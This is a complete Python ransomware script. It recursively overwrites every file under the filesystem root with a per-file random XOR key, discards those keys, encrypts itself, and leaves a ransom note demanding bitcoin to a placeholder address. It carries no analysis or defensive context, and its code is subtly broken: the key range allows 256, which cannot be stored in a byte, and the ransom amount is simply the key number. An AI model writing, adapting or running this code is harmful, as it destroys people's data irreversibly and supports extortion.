import os
import random

def encrypt_file(filename):
    key = random.randint(1, 256)
    with open(filename, 'rb') as f:
        data = bytearray(f.read())
    for i in range(len(data)):
        data[i] ^= key
    with open(filename, 'wb') as f:
        f.write(data)
    return key

def encrypt_directory(path):
    for root, dirs, files in os.walk(path):
        for file in files:
            encrypt_file(os.path.join(root, file))

def create_ransom_note(key):
    with open('README.txt', 'w') as f:
        f.write(f'Your files have been encrypted. To decrypt them, send {key} BTC to the following address: [INSERT ADDRESS HERE]')

encrypt_directory('/')

key = encrypt_file(__file__)
create_ransom_note(key)
